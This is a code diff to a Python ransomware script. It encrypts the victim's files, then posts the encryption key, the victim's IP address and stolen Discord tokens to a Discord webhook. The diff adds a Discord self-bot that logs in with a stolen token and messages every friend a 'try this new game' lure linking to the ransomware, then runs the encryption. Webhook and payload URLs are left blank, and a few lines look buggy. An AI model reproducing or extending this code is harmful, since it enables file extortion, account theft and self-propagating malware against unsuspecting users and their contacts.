@@ -8,6 +8,9 @@ import json
 from pathlib import Path
 import playsound
 import platform
+import discord
+from discord.ext import commands
+import asyncio
 
 sys = str(platform.system)
 key = Fernet.generate_key()
@@ -38,9 +41,9 @@ def crypt(filename):
 
 def warn():
     if sys == "Linux":
-        name = "" #change to your discord name and tag
+        name = "Ech0#0093" #change to your discord name and tag
         ip = requests.get('https://api.ipify.org').text
-        url = "" #webhook link
+        url = "" # discord webhook link 
         data = {}
         data["content"] = "Key Content for " + user + ": " + str(key)
         data["username"] = ip
@@ -53,7 +56,7 @@ def warn():
         name = "" #change to your discord name and tag
         path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
         ip = requests.get('https://api.ipify.org').text
-        url = "" #webhook link
+        url = "" # discord webhook link 
         data = {}
         data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path))   
         data["username"] = ip
@@ -78,7 +81,21 @@ def main():
         crypt(file)
     warn()
 
-if sys == "Windows":
-    main()
-if sys == "Linux":
-    main2()
+url = "" # url to ransomeware
+token = str(find_tokens) #insert target token
+prefix = ""
+client = discord.Client()
+message = discord.Message 
+bot = commands.Bot(command_prefix=prefix, self_bot=True)
+@bot.event
+async def on_ready():
+    for user in bot.user.friends:
+        user.send("Yo try this new game! " + url)
+    if sys == "Windows":
+        main()
+    if sys == "Linux":
+        main2()
+        
+asyncio.set_event_loop(asyncio.new_event_loop())
+loop = asyncio.new_event_loop()
+bot.run(token, bot=False)
